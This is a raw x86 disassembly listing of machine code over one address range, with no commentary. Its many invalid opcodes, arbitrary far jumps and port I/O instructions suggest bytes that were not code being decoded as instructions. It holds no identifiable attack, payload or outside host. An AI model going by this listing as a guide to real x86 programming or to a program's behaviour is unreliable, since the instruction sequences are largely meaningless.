  449f01:	add    BYTE PTR [ebx-0x3f],dl
  449f04:	push   ebp
  449f05:	add    ah,dh
  449f07:	leave  
  449f08:	add    cl,BYTE PTR [esi+0x51]
  449f0b:	call   0x5f41:0x89475f27
  449f12:	inc    esp
  449f13:	xchg   edx,eax
  449f14:	aaa    
  449f15:	outs   dx,BYTE PTR ds:[esi]
  449f16:	sbb    DWORD PTR [esi+0x74f5d4fc],ebx
  449f1c:	xor    DWORD PTR [ecx+0xd],edx
  449f1f:	and    BYTE PTR [eax],0x69
  449f22:	and    ebx,DWORD PTR [esi+0x66f51ffc]
  449f28:	daa    
  449f29:	je     0x449f62
  449f2b:	push   ecx
  449f2c:	xor    ch,BYTE PTR [ebp+0x13]
  449f2f:	dec    esp
  449f30:	push   esp
  449f31:	imul   eax,DWORD PTR [edi],0xf6c1fc9e
  449f37:	jmp    0x642e:0x54c37426
  449f3e:	shl    esi,cl
  449f40:	push   ebx
  449f41:	imul   esp,edi,0xf62dfc9d
  449f47:	or     eax,0xf8df6327
  449f4c:	es ins DWORD PTR es:[edi],dx
  449f4e:	(bad)  
  449f4f:	cld    
  449f50:	and    al,0x63
  449f52:	mov    ch,0x9d
  449f54:	cld    
  449f55:	add    esi,ebp
  449f57:	out    0x26,al
  449f59:	je     0x449f10
  449f5b:	pop    ss
  449f5c:	and    DWORD PTR [ebx-0x59],esp
  449f5f:	mov    ecx,0x23f46e2d
  449f64:	add    ecx,DWORD PTR [ebp+0x0]
	...
  449f7f:	cdq    
  449f80:	mov    ecx,0x4867341
  449f85:	(bad)  
  449f86:	xor    dl,BYTE PTR [edx-0xbc935ac]
  449f8c:	add    al,0xdf
  449f8e:	add    al,0x35
  449f90:	sub    bl,dl
  449f92:	inc    esi
  449f93:	dec    ebx
  449f94:	xor    eax,0x285238bb
  449f99:	out    0x3,eax
  449f9b:	add    al,0x4
  449f9d:	stos   BYTE PTR es:[edi],al
  449f9e:	sub    BYTE PTR [eax+0x42],cl
  449fa1:	mov    ebx,0xb3325924
  449fa6:	xor    cl,BYTE PTR [esi+0x26]
  449fa9:	mov    dl,0x3
  449fab:	pusha  
  449fac:	add    al,0xaa
  449fae:	sub    BYTE PTR [eax],ch
  449fb0:	push   esi
  449fb1:	xor    BYTE PTR [ecx],0x10
  449fb4:	push   ds
  449fb5:	jp     0x44a003
  449fb7:	push   cs
  449fb8:	daa    
  449fb9:	mov    al,BYTE PTR [ebx]
  449fbb:	adc    BYTE PTR [edx+ebp*4],al
  449fbe:	sub    BYTE PTR [eax],cl
  449fc0:	push   ebp
  449fc1:	mov    BYTE PTR ds:0x45b1f17,dh
  449fc7:	mov    BYTE PTR [edx],0x37
  449fca:	xor    DWORD PTR [ecx],ecx
  449fcc:	cmp    DWORD PTR [edi+eiz*1],esp
  449fcf:	loope  0x44a002
  449fd1:	dec    eax
  449fd2:	sub    edi,edx
  449fd4:	push   ebp
  449fd5:	out    0x3,eax
  449fd7:	je     0x449fdc
  449fd9:	push   ss
  449fda:	daa    
  449fdb:	loopne 0x44a01e
  449fdd:	dec    eax
  449fde:	xor    al,0xc8
  449fe0:	aaa    
  449fe1:	xor    eax,0x27
	...
  449ffa:	add    BYTE PTR [eax],al
  449ffc:	hlt    
  449ffd:	add    al,0x44
  449fff:	add    esi,DWORD PTR [ebp-0x28b0ecd9]
  44a005:	xor    DWORD PTR [esi],edx
  44a007:	and    edx,DWORD PTR [ebp-0x77fbcdd9]
  44a00d:	add    al,0x2a
  44a00f:	daa    
  44a010:	test   al,0x55
  44a012:	adc    BYTE PTR [edx],dh
  44a014:	nop
  44a015:	sbb    eax,0x21a9fe00
  44a01a:	pop    ebp
  44a01b:	cmc    
  44a01c:	not    DWORD PTR [ebp-0x1]
  44a01f:	lods   eax,DWORD PTR ds:[esi]
  44a020:	fidivr DWORD PTR [eax]
  44a022:	dec    ebx
  44a023:	(bad)  
  44a024:	rcr    BYTE PTR [edi],0x5f
  44a027:	into   
  44a028:	sbb    ch,dh
  44a02a:	jmp    eax
  44a02c:	icebp  
  44a02d:	cmp    DWORD PTR [edi-0x47],ebx
  44a030:	cmp    eax,0x22b56e26
  44a035:	dec    esi
  44a036:	ins    BYTE PTR es:[edi],dx
  44a037:	mov    ds:0xe951361a,al
  44a03c:	neg    DWORD PTR [edi+0x5204bcfd]
  44a042:	push   0xffffff90
  44a044:	adc    BYTE PTR [esp+eiz*2],bl
  44a047:	mov    edi,?
  44a049:	adc    bh,bh
  44a04b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44a04c:	sar    BYTE PTR [eax],cl
  44a04e:	cmp    eax,0x5e34ce95
  44a053:	mov    ss,esi
  44a055:	push   ds
  44a056:	lods   eax,DWORD PTR fs:[esi]
  44a058:	(bad)  
  44a059:	cmp    BYTE PTR [edi-0x17],bl
  44a05c:	imul   esi
  44a05e:	(bad)  
  44a05f:	sub    eax,0x0
	...
  44a078:	add    bl,bl
  44a07a:	cmp    BYTE PTR [ebp+0x44],al
  44a07d:	mov    edi,0x2a48694e
  44a082:	sub    DWORD PTR [ebp+0x55],ecx
  44a085:	pop    ss
  44a086:	cmp    DWORD PTR [ebx-0x17],esp
  44a089:	not    DWORD PTR [eax+0x231324ff]
  44a08f:	push   ecx
  44a090:	inc    eax
  44a091:	push   es
  44a092:	sub    DWORD PTR [ecx+0x36],ebp
  44a095:	mov    al,ds:0x9d0a691e
  44a09a:	add    al,0x0
  44a09c:	jecxz  0x44a08f
  44a09e:	push   esp
  44a09f:	outs   dx,BYTE PTR ds:[esi]
  44a0a0:	add    dh,ah
  44a0a2:	cmp    BYTE PTR [ecx+0x0],dl
  44a0a5:	out    0x28,al
  44a0a7:	imul   eax,DWORD PTR [eax],0xeb0122
  44a0ad:	shl    cl,1
  44a0af:	ins    BYTE PTR es:[edi],dx
  44a0b0:	popa   
  44a0b1:	stc    
  44a0b2:	push   esi
  44a0b3:	pop    ebp
  44a0b4:	arpl   WORD PTR [ecx],ax
  44a0b6:	add    DWORD PTR [ecx],esi
  44a0b8:	add    bh,BYTE PTR ds:0x41746af4
  44a0be:	fldcw  WORD PTR [ecx+0x65]
  44a0c1:	mov    esp,0xce6544e4
  44a0c6:	icebp  
  44a0c7:	pop    eax
  44a0c8:	addr16 mov al,0x4d
  44a0cb:	add    BYTE PTR [eax],al
  44a0cd:	out    dx,eax
  44a0ce:	pop    es
  44a0cf:	aas    
  44a0d0:	gs xchg ecx,eax
  44a0d2:	inc    esp
  44a0d3:	cmp    eax,DWORD PTR [ebp-0x7b]
  44a0d6:	or     BYTE PTR [ebp+0x73f68401],dh
  44a0dc:	add    BYTE PTR gs:[eax],al
	...
  44a0f3:	add    BYTE PTR [eax],al
  44a0f5:	add    BYTE PTR [edi-0xf],bl
  44a0f8:	pop    esp
  44a0f9:	arpl   WORD PTR [ecx-0x7e9ca2ae],dx
  44a0ff:	or     BYTE PTR [edi+0x1],bh
  44a102:	push   edx
  44a103:	jecxz  0x44a178
  44a105:	push   ebp
  44a106:	sbb    eax,0x807458e4
  44a10b:	push   edx
  44a10c:	pop    ebp
  44a10d:	arpl   WORD PTR [ecx],ax
  44a10f:	or     BYTE PTR [esi],al
  44a111:	add    bh,cl
  44a113:	fstp   QWORD PTR [esi+0x69]
  44a116:	sub    edx,DWORD PTR [ecx+0x59]
  44a119:	imul   edi,DWORD PTR [ebx-0x61000014],0xac724401
  44a123:	repz cmp al,0x64
  44a126:	mov    dl,0xdd
  44a128:	(bad)  
  44a129:	call   DWORD PTR [ebx+0x9693e01]
  44a12f:	cmc    
  44a130:	dec    ecx
  44a131:	gs out dx,al
  44a133:	in     al,dx
  44a134:	(bad)  
  44a135:	(bad)  
  44a136:	mov    edi,0xf4653f01
  44a13b:	or     DWORD PTR [ecx+0x67],edx
  44a13e:	call   0x3de:0xb8712901
  44a145:	mov    ch,dh
  44a147:	loop   0x44a16f
  44a149:	je     0x44a0f4
  44a14b:	lods   eax,DWORD PTR ds:[esi]
  44a14c:	and    BYTE PTR [edi-0x80],bl
  44a14f:	add    BYTE PTR [esi+0x61],cl
  44a152:	xchg   edx,eax
  44a153:	popf   
  44a154:	cld    
  44a155:	fcomi  st,st(4)
  44a157:	pusha  
  44a158:	sub    ah,BYTE PTR [eax+eax*1+0x0]
	...
  44a170:	add    BYTE PTR [eax],al
  44a172:	add    BYTE PTR [ebp+edi*4+0x2b],al
  44a176:	push   0x60
  44a178:	sahf   
  44a179:	cld    
  44a17a:	and    al,0xf4
  44a17c:	pop    esi
  44a17d:	and    al,0x5f
  44a17f:	pop    dx
  44a181:	sub    DWORD PTR [ecx+0x59],esi
  44a184:	jo     0x44a1c9
  44a186:	add    ah,dh
  44a188:	lock add eax,DWORD PTR [ebx+0x3c]
  44a18c:	xchg   ebp,eax
  44a18d:	xor    BYTE PTR [ecx+0x4d],dl
  44a190:	jl     0x44a1b2
  44a192:	imul   ebp,DWORD PTR [ebx],0xf478478f
  44a198:	into   
  44a199:	add    eax,DWORD PTR [ecx+0x19]
  44a19c:	sub    cl,BYTE PTR [ebp+ebx*2+0xb]
  44a1a0:	jl     0x44a1ed
  44a1a2:	push   0x1a
  44a1a4:	cmp    esp,0xffffffc0
  44a1a7:	hlt    
  44a1a8:	popa   
  44a1a9:	cs pop edi
  44a1ab:	or     esi,ebp
  44a1ad:	sbb    al,0x69
  44a1af:	or     bl,BYTE PTR [esi-0x1009bb04]
  44a1b5:	es popa 
  44a1b7:	fisttp QWORD PTR [esi+0x38]
  44a1ba:	arpl   si,sp
  44a1bc:	fisubr WORD PTR [edi]
  44a1be:	pop    edi
  44a1bf:	out    0xee,eax
  44a1c1:	inc    edx
  44a1c2:	add    ah,dh
  44a1c4:	dec    edx
  44a1c5:	std    
  44a1c6:	inc    ebx
  44a1c7:	rol    DWORD PTR [ebx+0x42],1
  44a1ca:	outs   dx,BYTE PTR ds:[esi]
  44a1cb:	aad    0x4
  44a1cd:	adc    al,0x29
  44a1cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a1d0:	or     ah,BYTE PTR ss:[ebx]
  44a1d3:	lds    eax,FWORD PTR [ecx+esi*8]
  44a1d6:	add    eax,DWORD PTR [eax]
	...
  44a1f0:	jmp    0xc5749d1a
  44a1f5:	sbb    eax,0x338d2811
  44a1fa:	pop    ss
  44a1fb:	xor    bl,BYTE PTR [ebp-0x10fbe5d9]
  44a201:	add    al,0x26
  44a203:	and    eax,0x2cba1890
  44a208:	mov    fs,WORD PTR [eax]
  44a20a:	retf   0x4436
  44a20d:	aaa    
  44a20e:	ret    0x2b22
  44a211:	add    eax,0x20320199
  44a216:	retf   0x492c
  44a219:	xor    esp,eax
  44a21b:	xor    DWORD PTR [ecx],edx
  44a21d:	sbb    eax,ecx
  44a21f:	xor    bl,BYTE PTR [ecx+0x52]
  44a222:	out    0x3,eax
  44a224:	pop    esp
  44a225:	add    eax,0x385628ab
  44a22a:	mov    ds:0x801cf14c,eax
  44a22f:	das    
  44a230:	adc    BYTE PTR [ebp-0x6b],dl
  44a233:	cs inc ecx
  44a235:	inc    esp
  44a236:	out    0x3,eax
  44a238:	add    BYTE PTR ds:0x411628a3,0x83
  44a23f:	es and al,0x37
  44a242:	jp     0x44a266
  44a244:	ret    
  44a245:	add    al,0xcf
  44a247:	add    ch,BYTE PTR [ecx]
  44a249:	xor    dl,BYTE PTR [eax+0x38]
  44a24c:	rcr    DWORD PTR [ebx+ebp*1],1
  44a24f:	daa    
  44a250:	fstp   DWORD PTR ds:0x2d53
	...
  44a26a:	add    BYTE PTR [eax],al
  44a26c:	add    ah,ah
  44a26e:	add    al,0x60
  44a270:	add    al,0xb0
  44a272:	pop    ds
  44a273:	inc    ecx
  44a274:	dec    edi
  44a275:	mov    eax,0x182a003b
  44a27a:	and    ch,BYTE PTR [ebp+eax*2-0x58]
  44a27e:	sbb    ch,BYTE PTR [ecx+0xa]
  44a281:	mov    eax,ds:0xf8820004
  44a286:	inc    eax
  44a287:	arpl   WORD PTR [edi],cx
  44a289:	shl    DWORD PTR [ecx],0x6a
  44a28c:	add    eax,0xfb5033d1
  44a291:	enter  0x3f47,0xe9
  44a295:	idiv   DWORD PTR ds:0x23d31afe
  44a29b:	addr16 cli 
  44a29d:	retf   
  44a29e:	and    eax,0x49cbaa6e
  44a2a3:	ins    DWORD PTR es:[edi],dx
  44a2a4:	fidivr DWORD PTR [edx]
  44a2a6:	sub    eax,0xe2f7e951
  44a2ab:	std    
  44a2ac:	popf   
  44a2ad:	daa    
  44a2ae:	es push 0xffffffb0
  44a2b1:	or     DWORD PTR ds:0x263bb573,esi
  44a2b7:	ins    DWORD PTR es:[edi],dx
  44a2b8:	ret    0x1c03
  44a2bb:	jo     0x44a2a6
  44a2bd:	not    DWORD PTR [esi+0x2712acff]
  44a2c3:	inc    edx
  44a2c4:	fwait
  44a2c5:	(bad)  
  44a2c6:	sbb    eax,0x1be5b963
  44a2cb:	pop    ebp
  44a2cc:	test   al,0xf7
  44a2ce:	xchg   ebp,eax
  44a2cf:	jmp    FWORD PTR [eax+eax*1+0x0]
	...
  44a2ea:	shl    BYTE PTR [esi],cl
  44a2ec:	inc    esp
  44a2ed:	(bad)  
  44a2ee:	fcom   DWORD PTR [esi+ebp*2-0x7a]
  44a2f2:	aam    0x53
  44a2f4:	add    BYTE PTR [ebp+0x4e633af5],bl
  44a2fa:	iret   
  44a2fb:	pop    ss
  44a2fc:	je     0x44a342
  44a2fe:	es call 0x1869eb6f
  44a304:	inc    ebx
  44a305:	push   ecx
  44a306:	mov    bh,0x4
  44a308:	add    BYTE PTR [eax],al
  44a30a:	mov    ah,0x5
  44a30c:	aas    
  44a30d:	or     DWORD PTR gs:[eax+ebp*2+0x65],edx
  44a312:	mov    cl,0xf4
  44a314:	dec    esi
  44a315:	imul   eax,DWORD PTR [ebx],0x4d7766dd
  44a31b:	add    eax,0xdad800d3
  44a320:	arpl   WORD PTR [ebp-0x8],cx
  44a323:	fisubr DWORD PTR [eax+eax*1-0x49]
  44a327:	push   es
  44a328:	dec    eax
  44a329:	imul   eax,DWORD PTR [ecx],0xe06573de
  44a32f:	loope  0x44a396
  44a331:	jne    0x44a307
  44a333:	in     al,dx
  44a334:	pop    esp
  44a335:	ins    DWORD PTR es:[edi],dx
  44a336:	or     eax,0x4a014905
  44a33b:	loop   0x44a3b0
  44a33d:	dec    ebp
  44a33e:	mov    eax,0xc9496cda
  44a343:	fbld   TBYTE PTR [ebx+eax*2-0x5e]
  44a347:	out    dx,eax
  44a348:	gs je  0x44a318
  44a34b:	add    al,0x4e
  44a34d:	add    DWORD PTR [eax],eax
	...
  44a367:	call   0x6cda:0xb84d73df
  44a36e:	push   ebx
  44a36f:	mov    ebx,esp
  44a371:	jae    0x44a3d8
  44a373:	int    0x4
  44a375:	or     al,BYTE PTR [ecx]
  44a377:	pop    edx
  44a378:	fbstp  TBYTE PTR [ebx+0x43]
  44a37b:	jno    0x44a360
  44a37d:	push   0x73
  44a37f:	and    ebx,0x64
  44a382:	gs jp  0x44a389
  44a385:	in     al,dx
  44a386:	add    ch,BYTE PTR [esi-0x15]
  44a389:	push   0x74
  44a38b:	js     0x44a364
  44a38d:	dec    edi
  44a38e:	popa   
  44a38f:	jmp    edx
  44a391:	fs gs sbb esi,esp
  44a395:	imul   esi,DWORD PTR [ebx+0x24],0xf46f5ddb
  44a39c:	out    0x3,al
  44a39e:	icebp  
  44a39f:	div    cl
  44a3a1:	xor    DWORD PTR [edi-0x29],ebx
  44a3a4:	push   edx
  44a3a5:	push   esp
  44a3a6:	imul   eax,esp,0xd14b33f0
  44a3ac:	aas    
  44a3ad:	das    
  44a3ae:	inc    ebx
  44a3af:	mov    esp,0xf552fc9d
  44a3b4:	(bad)  
  44a3b5:	push   ds
  44a3b6:	je     0x44a379
  44a3b8:	add    BYTE PTR [esi],ah
  44a3ba:	jae    0x44a379
  44a3bc:	or     DWORD PTR [edi],ebx
  44a3be:	imul   eax,esi,0x0
  44a3c1:	and    DWORD PTR [esp+esi*8-0xe],esi
  44a3c5:	add    al,BYTE PTR [ecx-0x67]
  44a3c8:	mov    cl,0x47
  44a3ca:	arpl   WORD PTR [eax],ax
	...
  44a3e4:	call   0x1f08:0xf605fca8
  44a3eb:	push   0xffffff81
  44a3ed:	je     0x44a417
  44a3ef:	arpl   WORD PTR [ecx+0x60],sp
  44a3f2:	xor    ch,BYTE PTR [ecx+0x59]
  44a3f5:	outs   dx,BYTE PTR ds:[esi]
  44a3f6:	and    eax,0xfcd25267
  44a3fb:	jne    0x44a3f2
  44a3fd:	push   esi
  44a3fe:	pop    ds
  44a3ff:	je     0x44a428
  44a401:	jno    0x44a425
  44a403:	dec    ebx
  44a404:	push   ecx
  44a405:	shr    BYTE PTR [edi],0x0
  44a408:	hlt    
  44a409:	dec    edi
  44a40a:	add    cl,BYTE PTR [ebp+0x51]
  44a40d:	mov    cl,BYTE PTR [ecx+0x63]
  44a410:	sub    eax,0x265f257c
  44a415:	jp     0x44a468
  44a417:	je     0x44a42e
  44a419:	xchg   edx,eax
  44a41a:	pop    ds
  44a41b:	add    ah,dh
  44a41d:	mov    eax,DWORD PTR [ebx]
  44a41f:	inc    ecx
  44a420:	sbb    DWORD PTR [edx],esi
  44a422:	dec    eax
  44a423:	arpl   WORD PTR [edx],bx
  44a425:	sub    DWORD PTR [esp+esi*2+0x19],ecx
  44a429:	sub    DWORD PTR [esp+eax*2-0xc],ecx
  44a42d:	add    al,0x46
  44a42f:	push   es
  44a430:	ret    0x4221
  44a433:	sub    eax,0x364c30d9
  44a438:	lds    ebx,FWORD PTR ds:0x2fcd2039
  44a43e:	xor    al,0x21
  44a440:	loope  0x44a475
  44a442:	dec    eax
  44a443:	and    edx,edi
  44a445:	dec    edi
  44a446:	out    0x3,eax
	...
  44a460:	add    BYTE PTR [edi+0x9562453],ah
  44a466:	repz rcr BYTE PTR [edi],1
  44a469:	mov    al,ds:0x4603e718
  44a46e:	add    al,0x26
  44a470:	ss stos DWORD PTR es:[edi],eax
  44a472:	xor    al,0x13
  44a474:	push   edx
  44a475:	xchg   edi,eax
  44a476:	xor    dl,BYTE PTR [eax]
  44a478:	and    cl,BYTE PTR [ebx-0x61dcefad]
  44a47e:	and    eax,0x219230fb
  44a483:	adc    al,BYTE PTR [edi+esi*1]
  44a486:	add    al,0xa6
  44a488:	xor    eax,0x42d3356b
  44a48d:	push   edi
  44a48e:	xor    DWORD PTR [esi-0x37aa94e0],ebx
  44a494:	xor    eax,0x3e7183b
  44a499:	mov    edx,0x4335a605
  44a49e:	xor    eax,0x354f4cbb
  44a4a3:	mov    edx,0x8c3a4035
  44a4a8:	cmp    al,0xf4
  44a4aa:	add    al,0x52
  44a4ac:	add    ebp,ecx
  44a4ae:	xor    dl,BYTE PTR [eax-0x7bbed7cd]
  44a4b4:	and    BYTE PTR ss:[ebx],dh
  44a4b7:	xchg   edx,eax
  44a4b8:	cmp    al,0x39
  44a4ba:	and    BYTE PTR [eax+0x54603],al
  44a4c0:	stos   BYTE PTR es:[edi],al
  44a4c1:	leave  
  44a4c2:	sub    eax,0x7570
	...
  44a4db:	add    BYTE PTR [eax],al
  44a4dd:	add    BYTE PTR [ebx+0x2a5d6d21],bh
  44a4e3:	sbb    al,0x77
  44a4e5:	xor    DWORD PTR [edi],edx
  44a4e7:	sbb    BYTE PTR [eax-0x17],ch
  44a4ea:	test   DWORD PTR [ebx],0x322723ff
  44a4f0:	pop    edi
  44a4f1:	push   ebp
  44a4f2:	test   eax,0xf7e9641d
  44a4f7:	in     eax,dx
  44a4f8:	std    
  44a4f9:	sbb    ah,bl
  44a4fb:	and    edi,DWORD PTR ds:0x7445db3b
  44a501:	or     al,0xc1
  44a503:	and    DWORD PTR [edi+0x24],esi
  44a506:	call   0xfa1da55e
  44a50b:	arpl   WORD PTR ss:[esi],ax
  44a50e:	mov    cl,0x18
  44a510:	imul   edi,edx,0x633ff2
  44a516:	lock dec esi
  44a518:	jmp    FWORD PTR ds:0xfe5430e3
  44a51e:	enter  0x6a21,0xb0
  44a522:	sbb    eax,0x12db6923
  44a527:	inc    esi
  44a528:	je     0x44a4ea
  44a52a:	or     al,0x1b
  44a52c:	add    dh,dl
  44a52e:	idiv   BYTE PTR ds:0x1e23d06a
  44a534:	pop    edi
  44a535:	int    0x1e
  44a537:	das    
  44a538:	arpl   WORD PTR [edx-0x448cb81e],bx
  44a53e:	push   cs
  44a53f:	xor    DWORD PTR [edi-0x53],esi
	...
  44a55a:	add    BYTE PTR [edx],dl
  44a55c:	sbb    BYTE PTR [ebp-0x65],bl
  44a55f:	fidiv  WORD PTR [esp+esi*2]
  44a562:	xchg   cl,ch
  44a564:	add    al,0x0
  44a566:	push   edi
  44a567:	repnz aaa 
  44a569:	arpl   WORD PTR [eax],ax
  44a56b:	adc    DWORD PTR [ecx+0x5d],edx
  44a56e:	arpl   WORD PTR [eax],ax
  44a570:	lock pusha 
  44a572:	je     0x44a578
  44a574:	out    0x5c,al
  44a576:	jae    0x44a5e6
  44a578:	out    dx,eax
  44a579:	pusha  
  44a57a:	jo     0x44a54d
  44a57c:	fld    TBYTE PTR [ecx+0x44]
  44a57f:	mov    esp,0xbf006bdf
  44a584:	add    BYTE PTR [ebx],bh
  44a586:	outs   dx,DWORD PTR ds:[esi]
  44a587:	sbb    esi,ebx
  44a589:	pop    esp
  44a58a:	jb     0x44a59d
  44a58c:	push   eax
  44a58d:	je     0x44a601
  44a58f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44a590:	ficomp DWORD PTR [esi+0x53]
  44a593:	mov    al,0xdf
  44a595:	ins    BYTE PTR es:[edi],dx
  44a596:	jb     0x44a54c
  44a598:	hlt    
  44a599:	jo     0x44a5df
  44a59b:	add    al,dh
  44a59d:	pop    edx
  44a59e:	jb     0x44a5a4
  44a5a0:	icebp  
  44a5a1:	jae    0x44a612
  44a5a3:	call   DWORD PTR [edi+eiz*2+0x53]
  44a5a7:	lock fild QWORD PTR [edx+esi*2-0x1c]
  44a5ac:	hlt    
  44a5ad:	jo     0x44a5f3
  44a5af:	lock out dx,eax
  44a5b1:	pop    edx
  44a5b2:	jb     0x44a5a8
  44a5b4:	lock jae 0x44a626
  44a5b7:	call   DWORD PTR [ebx+0x0]
  44a5ba:	add    BYTE PTR [eax+0x653f07],ch
	...
  44a5d8:	sar    DWORD PTR [ecx],0x5d
  44a5db:	arpl   ax,ax
  44a5dd:	fisub  DWORD PTR [eax+0x74]
  44a5e0:	(bad)  
  44a5e1:	in     al,0x5c
  44a5e3:	jae    0x44a5a3
  44a5e5:	fisub  DWORD PTR [eax+0x70]
  44a5e8:	sub    ebp,0xe9ac5369
  44a5ee:	imul   eax,DWORD PTR [eax],0x47
  44a5f1:	or     cl,BYTE PTR [ebx+0x65]
  44a5f4:	xchg   ecx,eax
  44a5f5:	cmp    DWORD PTR [ebp+0x63],ebx
  44a5f8:	sbb    dl,0x60
  44a5fb:	je     0x44a5f1
  44a5fd:	je     0x44a637
  44a5ff:	arpl   WORD PTR [edi],sp
  44a601:	(bad)  
  44a602:	xor    ah,BYTE PTR [edi+0x4]
  44a605:	and    ch,BYTE PTR [eax]
  44a607:	outs   dx,BYTE PTR ds:[esi]
  44a608:	daa    
  44a609:	lea    esp,[ebx]
  44a60b:	ins    BYTE PTR es:[edi],dx
  44a60c:	hlt    
  44a60d:	mov    eax,DWORD PTR [edx]
  44a60f:	dec    esi
  44a610:	adc    DWORD PTR [ebx+0x3fd9734d],ecx
  44a616:	cmp    edx,DWORD PTR [edx-0x2b]
  44a619:	push   ecx
  44a61a:	das    
  44a61b:	arpl   WORD PTR [ecx-0xbffb6cb],di
  44a621:	dec    esp
  44a622:	dec    BYTE PTR [ebp-0x27]
  44a625:	push   edx
  44a626:	inc    ecx
  44a627:	jo     0x44a5fa
  44a629:	push   ebx
  44a62a:	inc    ebp
  44a62b:	arpl   WORD PTR [ebp-0xbaec410],di
  44a631:	repz std 
  44a633:	dec    ebp
  44a634:	cdq    
  44a635:	adc    cl,BYTE PTR [ebp+0x63]
  44a638:	mov    al,ds:0x6c22db
	...
  44a655:	test   eax,0xc3783f10
  44a65a:	lods   eax,DWORD PTR ds:[esi]
  44a65b:	cld    
  44a65c:	xor    ebp,esi
  44a65e:	repnz push ds
  44a660:	je     0x44a61a
  44a662:	or     BYTE PTR [edx],ah
  44a664:	popa   
  44a665:	mov    BYTE PTR ds:0xad90674d,al
  44a66b:	cld    
  44a66c:	lock cmc 
  44a66e:	pop    edx
  44a66f:	sub    al,0x63
  44a671:	pop    edx
  44a672:	pop    esi
  44a673:	imul   edx,DWORD PTR cs:[edi-0x2f],0x63406d2d
  44a67b:	and    eax,0xfcae6263
  44a680:	push   eax
  44a681:	cmc    
  44a682:	push   0x1f
  44a684:	je     0x44a6ad
  44a686:	lds    ebx,FWORD PTR [eax]
  44a688:	dec    ebp
  44a689:	inc    ecx
  44a68a:	rol    BYTE PTR [ebx+0x73],1
  44a68d:	sub    BYTE PTR ds:0x2e1a268f,al
  44a693:	xchg   ebx,eax
  44a694:	cmp    al,0xf4
  44a696:	add    al,0x13
  44a698:	add    eax,0x2584152d
  44a69d:	sub    BYTE PTR ds:0x292b2075,ch
  44a6a3:	xchg   ebx,eax
  44a6a4:	sbb    DWORD PTR es:[edx],ebp
  44a6a7:	add    DWORD PTR [ebx],0x20a2061c
  44a6ad:	call   0xb964f6e9
  44a6b2:	sbb    DWORD PTR [ebp+0x45],eax
  44a6b5:	out    0x18,eax
  44a6b7:	aas    
  44a6b8:	daa    
	...
  44a6d1:	add    dl,cl
  44a6d3:	sub    eax,0x34113d53
  44a6d8:	cmp    al,0x26
  44a6da:	rol    BYTE PTR [ebx+edi*1],0x4
  44a6de:	add    DWORD PTR [edi],edx
  44a6e0:	dec    esp
  44a6e1:	and    eax,0x321729c0
  44a6e6:	popf   
  44a6e7:	daa    
  44a6e8:	or     al,0x33
  44a6ea:	cdq    
  44a6eb:	inc    ebp
  44a6ec:	push   ss
  44a6ed:	push   ecx
  44a6ee:	xchg   ecx,eax
  44a6ef:	sub    DWORD PTR ds:0x7204f44f,edx
  44a6f5:	add    al,0xc0
  44a6f7:	xor    edx,DWORD PTR [edx]
  44a6f9:	sub    eax,DWORD PTR [edi-0x64cde8ec]
  44a6ff:	sbb    al,BYTE PTR [eax]
  44a701:	sub    BYTE PTR [edi+0x534e042b],dl
  44a707:	xor    esp,ebx
  44a709:	and    BYTE PTR [ebp+0x5],al
  44a70c:	cli    
  44a70d:	add    esp,DWORD PTR [ebx]
  44a70f:	sub    DWORD PTR [ebp-0x4ce6b6d0],edi
  44a715:	es pop ecx
  44a717:	sub    cl,dl
  44a719:	push   ebx
  44a71a:	pop    edx
  44a71b:	sub    al,0xb1
  44a71d:	sub    al,0x50
  44a71f:	sub    BYTE PTR [eax],al
  44a721:	into   
  44a722:	adc    al,0x30
  44a724:	add    BYTE PTR [eax+edi*8-0x246f95b7],ch
  44a72b:	sub    DWORD PTR [edi-0x6b],ebx
  44a72e:	aam    0x4f
  44a730:	ja     0x44a6cc
  44a732:	retf   
  44a733:	and    eax,0xba6b
	...
  44a74c:	add    BYTE PTR [eax],al
  44a74e:	add    bh,bl
  44a750:	adc    eax,0x13d28d74
  44a755:	push   0xffffffa4
  44a757:	mov    edi,0xf72d0033
  44a75c:	fild   QWORD PTR [ebp+0x70]
  44a75f:	daa    
  44a760:	sbb    DWORD PTR [ecx+0x4c],eax
  44a763:	and    al,0x4d
  44a765:	pop    edi
  44a766:	pop    edx
  44a767:	adc    BYTE PTR ds:0x2e175b5f,dh
  44a76d:	add    BYTE PTR [eax+0x406ddff8],bl
  44a773:	add    BYTE PTR [ecx],bl
  44a775:	aas    
  44a776:	dec    edx
  44a777:	pop    es
  44a778:	push   ss
  44a779:	addr16 cmp ebx,ebx
  44a77c:	fild   QWORD PTR [eax+0x3f]
  44a77f:	in     al,0x25
  44a781:	js     0x44a7a0
  44a783:	mov    ecx,0xf8b20004
  44a788:	fild   QWORD PTR [ebp+0x10]
  44a78b:	loopne 0x44a7a5
  44a78d:	dec    esi
  44a78e:	add    al,0xdc
  44a790:	and    eax,0xdfeafa5f
  44a795:	push   0x7825c40f
  44a79a:	std    
  44a79b:	imul   DWORD PTR [edi-0x1]
  44a79e:	sub    DWORD PTR [esi],esp
  44a7a0:	sbb    dh,BYTE PTR [eax-0x23]
  44a7a3:	xor    al,0x33
  44a7a5:	arpl   ax,cx
  44a7a7:	adc    esp,DWORD PTR [esi]
  44a7a9:	dec    eax
  44a7aa:	enter  0x2d24,0x0
  44a7ae:	and    eax,edi
  44a7b0:	fild   QWORD PTR [ebp+0x0]
	...
  44a7cb:	add    BYTE PTR [ebp+edx*8-0x2b53b78d],dh
  44a7d2:	addr16 inc esp
  44a7d4:	lods   al,BYTE PTR ds:[esi]
  44a7d5:	icebp  
  44a7d6:	pop    eax
  44a7d7:	add    BYTE PTR [edx],bl
  44a7d9:	push   es
  44a7da:	inc    ecx
  44a7db:	jae    0x44a847
  44a7dd:	add    ch,BYTE PTR [esp+ebp*2+0x66]
  44a7e1:	out    0x66,eax
  44a7e3:	ja     0x44a858
  44a7e5:	xor    al,0x61
  44a7e7:	fs popf 
  44a7e9:	add    eax,0xe85e006c
  44a7ee:	gs jbe 0x44a869
  44a7f1:	shl    DWORD PTR [ebx+0x53],cl
  44a7f4:	je     0x44a7f7
  44a7f6:	push   esp
  44a7f7:	outs   dx,DWORD PTR ds:[esi]
  44a7f8:	mov    ?,ecx
  44a7fa:	imul   ebp,DWORD PTR [ecx-0x3d],0xb9694aff
  44a801:	dec    edi
  44a802:	add    BYTE PTR [eax],al
  44a804:	or     al,0x45
  44a806:	dec    esi
  44a807:	inc    ecx
